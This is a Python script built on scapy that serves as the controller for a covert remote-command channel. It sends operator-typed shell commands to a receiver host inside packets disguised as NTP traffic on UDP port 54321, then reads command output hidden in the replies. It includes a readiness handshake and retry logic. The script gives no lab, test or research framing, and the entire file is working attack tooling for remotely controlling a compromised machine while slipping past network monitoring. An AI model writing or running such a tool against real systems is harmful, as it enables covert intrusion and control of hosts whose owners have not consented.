from scapy.all import *
import struct
import time

RECEIVER_IP = "192.168.10.25"
PORT = 54321

def create_ntp_packet(command):
    ntp_packet = (b"\x1b" + b"\x00" * 3 + struct.pack("!d", 0.0) + struct.pack("!d", 0.0) + command.encode().ljust(64, b"\x00"))
    return IP(dst=RECEIVER_IP)/UDP(dport=PORT)/Raw(load=ntp_packet)

def decode_ntp_output(packet):
    if packet.haslayer(UDP) and packet[UDP].sport == PORT:
        ntp_payload = bytes(packet[UDP].payload)
        output = ntp_payload[16:].replace(b"\x00", b"").decode(errors="ignore")
        return output
    return None

def wait_for_receiver():
    print("[*] Waiting for receiver...")
    while True:
        print(f"[+] Sending READY to {RECEIVER_IP}")
        send(create_ntp_packet("READY"), verbose=False)
        response = sniff(filter=f"udp and port {PORT} and host {RECEIVER_IP}", count=1, timeout=2)
        if response:
            output = decode_ntp_output(response[0])
            print(f"[DEBUG] Received response: {repr(output)}")
            if output.strip() == "READY":
                print("[+] Receiver is ready!")
                return
        print("[-] Retrying...")
        time.sleep(2)

def send_commands():
    while True:
        cmd = input("Enter command (or 'exit'): ")
        if cmd.lower() == "exit":
            break
        for _ in range(3):  # Retry up to 3 times
            send(create_ntp_packet(cmd), verbose=False)
            response = sniff(filter=f"udp and port {PORT} and host {RECEIVER_IP}", count=1, timeout=10)
            if response:
                output = decode_ntp_output(response[0])
                if output:
                    print(f"[+] Output:\n{output}")
                    break
                else:
                    print("[-] No valid output received.")
            else:
                print("[-] No response received. Retrying...")
        else:
            print("[-] Failed to get a valid response after 3 retries.")

if __name__ == "__main__":
    wait_for_receiver()
    send_commands()